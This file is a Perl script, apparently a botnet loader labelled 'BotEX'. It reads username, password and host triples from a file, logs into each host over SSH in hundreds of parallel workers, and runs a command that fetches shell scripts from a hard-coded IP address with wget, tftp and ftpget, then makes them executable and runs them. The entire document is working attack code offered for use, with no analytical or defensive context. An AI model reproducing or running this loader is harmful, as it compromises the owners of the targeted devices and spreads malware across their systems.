#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __________        __ /\_______________  ___
# \______   \ _____/  |)/\_   _____/\   \/  /
#  |    |  _//  _ \   __\ |    __)_  \     / 
#  |    |   (  <_> )  |   |        \ /     \ 
#  |______  /\____/|__|  /_______  //___/\  \
#         \/                     \/       \_/
#
open(fh,'<','vuln.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://157.230.59.242/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 157.230.59.242 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 157.230.59.242; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.230.59.242 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh');
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mCommand Sent To --> ".$newarray[$c]."\n";
                } else {
                        print "\e[0;34mCan't Authenticate Host 
$newarray[$c]\n";
                }
        } else {
                print "\e[1;31;1mCant Connect To Host $newarray[$c]\n";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;

